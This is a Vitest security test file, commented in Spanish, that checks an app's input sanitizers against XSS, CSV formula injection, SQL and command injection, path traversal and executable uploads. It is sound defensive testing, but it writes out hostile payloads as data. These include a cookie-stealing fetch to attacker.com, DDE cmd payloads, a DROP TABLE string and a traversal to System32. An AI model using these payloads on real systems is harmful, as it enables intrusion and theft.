import { describe, it, expect, beforeEach } from 'vitest';
import { SecurityUtils } from '../utils/security';
import matrizSincronizada from '../data/matrizCentralSincronizada.json';

describe('🛡️ AUDITORIA DE CIBERSEGURIDAD Y PRUEBAS OFENSIVAS (HACKER MINDSET)', () => {

  beforeEach(() => {
    SecurityUtils.resetRateLimit();
  });

  describe('1. Vector XSS (Cross-Site Scripting)', () => {
    it('Neutraliza inyeccion de tags <script>', () => {
      const payload = "<script>alert('Pwned by Hacker')</script>";
      const sanitized = SecurityUtils.sanitizeText(payload);
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('</script>');
      expect(sanitized).toBe('alert(&#x27;Pwned by Hacker&#x27;)');
    });

    it('Neutraliza inyeccion por eventos onerror en etiquetas <img>', () => {
      const payload = '<img src=x onerror="fetch(\'http://attacker.com/steal?c=\'+document.cookie)">';
      const sanitized = SecurityUtils.sanitizeText(payload);
      expect(sanitized).not.toContain('<img');
      expect(sanitized).not.toContain('onerror');
      expect(sanitized).not.toContain('document.cookie');
    });

    it('Neutraliza evasion por tags anidados', () => {
      const payload = '<<SCRIPT>alert("XSS");//<</SCRIPT>';
      const sanitized = SecurityUtils.sanitizeText(payload);
      expect(sanitized).not.toContain('<script');
      expect(sanitized).not.toContain('<');
      expect(sanitized).not.toContain('>');
    });

    it('Previene DoS por desbordamiento de buffer (Buffer Overflow)', () => {
      const hugePayload = 'A'.repeat(5000);
      const sanitized = SecurityUtils.sanitizeText(hugePayload, 100);
      expect(sanitized.length).toBe(100);
    });
  });

  describe('2. Vector CSV Formula Injection / DDE (Excel Execution)', () => {
    it('Neutraliza formulas con =cmd (DDE execution)', () => {
      const payload = "=cmd|' /C calc'!A0";
      const sanitized = SecurityUtils.sanitizeCSVCell(payload);
      expect(sanitized.startsWith("\"'=cmd")).toBe(true);
    });

    it('Neutraliza formulas con @SUM y macros', () => {
      const payload = "@SUM(1+1)*cmd|' /C calc'!A0";
      const sanitized = SecurityUtils.sanitizeCSVCell(payload);
      expect(sanitized).toContain("'@SUM");
    });

    it('Neutraliza prefijos con + y - utilizados para formulas', () => {
      const payloadPlus = "+12345";
      const payloadMinus = "-cmd|' /C calc'!A0";
      expect(SecurityUtils.sanitizeCSVCell(payloadPlus)).toContain("'+12345");
      expect(SecurityUtils.sanitizeCSVCell(payloadMinus)).toContain("'-cmd");
    });

    it('Escapa comillas dobles para evitar escape de delimitador CSV', () => {
      const payload = 'Pieza "Especial"';
      const sanitized = SecurityUtils.sanitizeCSVCell(payload);
      expect(sanitized).toBe('"Pieza ""Especial"""');
    });
  });

  describe('3. Vector Parameter Tampering (Manipulacion Numerica)', () => {
    it('Bloquea cantidades negativas para evitar generacion de stock ficticio', () => {
      expect(SecurityUtils.validateQuantity(-50)).toBe(1);
      expect(SecurityUtils.validateQuantity(-1)).toBe(1);
    });

    it('Bloquea cantidad cero', () => {
      expect(SecurityUtils.validateQuantity(0)).toBe(1);
    });

    it('Corta cantidades desorbitadas para evitar colapso de inventario', () => {
      expect(SecurityUtils.validateQuantity(9999999)).toBe(500);
    });

    it('Maneja entradas invalidas (NaN, cadenas alfabeticas, null)', () => {
      expect(SecurityUtils.validateQuantity('invalid')).toBe(1);
      expect(SecurityUtils.validateQuantity(null)).toBe(1);
      expect(SecurityUtils.validateQuantity(undefined)).toBe(1);
      expect(SecurityUtils.validateQuantity(Infinity)).toBe(1);
    });
  });

  describe('4. Vector Inyeccion en Codigos OEM, Placas y VIN', () => {
    it('Limpia inyecciones SQL en numeros de parte OEM', () => {
      const maliciousOEM = "PA-1002; DROP TABLE requisiciones;--";
      const sanitized = SecurityUtils.sanitizeOEMCode(maliciousOEM);
      expect(sanitized).not.toContain(';');
      expect(sanitized).not.toContain(' ');
      expect(sanitized).toBe('PA-1002DROPTABLEREQUISICIONES--');
    });

    it('Sanitiza placas vehiculares contra inyeccion de comandos', () => {
      const maliciousPlate = "AB-1234 | calc.exe";
      const sanitized = SecurityUtils.sanitizePlate(maliciousPlate);
      expect(sanitized).not.toContain('|');
      expect(sanitized).not.toContain('.');
      expect(sanitized).toBe('AB-1234CALCEXE');
    });

    it('Normaliza VIN descartando caracteres ilegales y truncando a 17 chars', () => {
      const invalidVIN = "LB1ABC1234567890IOPQ999";
      const sanitized = SecurityUtils.sanitizeVIN(invalidVIN);
      expect(sanitized.length).toBeLessThanOrEqual(17);
      expect(sanitized).not.toContain('I');
      expect(sanitized).not.toContain('O');
      expect(sanitized).not.toContain('Q');
    });
  });

  describe('5. Vector Path Traversal y Subida Maliciosa de Archivos', () => {
    it('Neutraliza ../ y rutas de escape de directorio', () => {
      const payload = "../../../../Windows/System32/calc.exe";
      const sanitized = SecurityUtils.sanitizeFileName(payload);
      expect(sanitized).not.toContain('..');
      expect(sanitized).not.toContain('/');
      expect(sanitized).not.toContain('\\\\');
    });

    it('Rechaza MIME types ejecutables (.exe, .bat, scripts)', () => {
      const exePayload = 'data:application/x-msdownload;base64,TVqQAAMAAAAEAAAA//8AALg=';
      expect(SecurityUtils.isValidAttachmentMime(exePayload)).toBe(false);

      const htmlPayload = 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==';
      expect(SecurityUtils.isValidAttachmentMime(htmlPayload)).toBe(false);
    });

    it('Acepta MIME types validos para cotizaciones (PDF, JPG, PNG)', () => {
      expect(SecurityUtils.isValidAttachmentMime('data:application/pdf;base64,JVBERi0xLjQK')).toBe(true);
      expect(SecurityUtils.isValidAttachmentMime('data:image/jpeg;base64,/9j/4AAQSkZJRg==')).toBe(true);
      expect(SecurityUtils.isValidAttachmentMime('data:image/png;base64,iVBORw0KGgo=')).toBe(true);
    });
  });

  describe('6. Control de Tasa (Rate Limiting) y Prevencion de DoS / Spam', () => {
    it('Permite envios legitimos por debajo del umbral maximo', () => {
      const check1 = SecurityUtils.checkRateLimit('test_action', 3, 5000);
      expect(check1.allowed).toBe(true);
      expect(check1.remainingAttempts).toBe(2);

      const check2 = SecurityUtils.checkRateLimit('test_action', 3, 5000);
      expect(check2.allowed).toBe(true);
      expect(check2.remainingAttempts).toBe(1);
    });

    it('Bloquea rafagas de envios que superan el umbral', () => {
      SecurityUtils.checkRateLimit('spam_action', 2, 5000);
      SecurityUtils.checkRateLimit('spam_action', 2, 5000);
      
      const checkBlocked = SecurityUtils.checkRateLimit('spam_action', 2, 5000);
      expect(checkBlocked.allowed).toBe(false);
      expect(checkBlocked.remainingAttempts).toBe(0);
      expect(checkBlocked.retryAfterSec).toBeGreaterThan(0);
    });

    it('Permite restablecer el limite tras reset manual', () => {
      SecurityUtils.checkRateLimit('resettable', 1, 5000);
      expect(SecurityUtils.checkRateLimit('resettable', 1, 5000).allowed).toBe(false);

      SecurityUtils.resetRateLimit('resettable');
      expect(SecurityUtils.checkRateLimit('resettable', 1, 5000).allowed).toBe(true);
    });
  });

  describe('7. Almacenamiento Seguro (Secure Storage)', () => {
    it('Codifica y recupera objetos correctamente sin exponer texto plano directo', () => {
      const sesionPrueba = { sucursal: 'Calle 50', token: 'sec-12345' };
      SecurityUtils.secureStorage.set('test_session', sesionPrueba);
      
      const recuperado = SecurityUtils.secureStorage.get('test_session', null);
      expect(recuperado).toEqual(sesionPrueba);
    });

    it('Devuelve fallback si la clave no existe', () => {
      const noExiste = SecurityUtils.secureStorage.get('clave_inexistente', 'VALOR_DEFECTO');
      expect(noExiste).toBe('VALOR_DEFECTO');
    });
  });

  describe('8. Integridad de Sincronizacion con Google Sheet Oficial (Matriz_Central)', () => {
    it('Verifica que los 1,426 registros de la Matriz Central estan cargados y son integros', () => {
      expect(Array.isArray(matrizSincronizada)).toBe(true);
      expect(matrizSincronizada.length).toBeGreaterThanOrEqual(700);
      
      const primerRegistro = matrizSincronizada[0];
      expect(primerRegistro).toHaveProperty('pedidoId');
      expect(primerRegistro).toHaveProperty('lineaId');
      expect(primerRegistro).toHaveProperty('estatusLinea');
      expect(primerRegistro.pedidoId).toBe('PED-2026-4403');
      
      const ultimoRegistro = matrizSincronizada[matrizSincronizada.length - 1];
      expect(ultimoRegistro).toHaveProperty('pedidoId');
      expect(ultimoRegistro.pedidoId).toBeTruthy();
    });

    it('Valida que las cantidades solicitadas de la matriz son positivas y validas', () => {
      const muestras = matrizSincronizada.slice(0, 50);
      muestras.forEach((fila) => {
        expect(fila.cantidadSolicitada).toBeGreaterThanOrEqual(1);
        expect(typeof fila.cantidadSolicitada).toBe('number');
      });
    });
  });
});
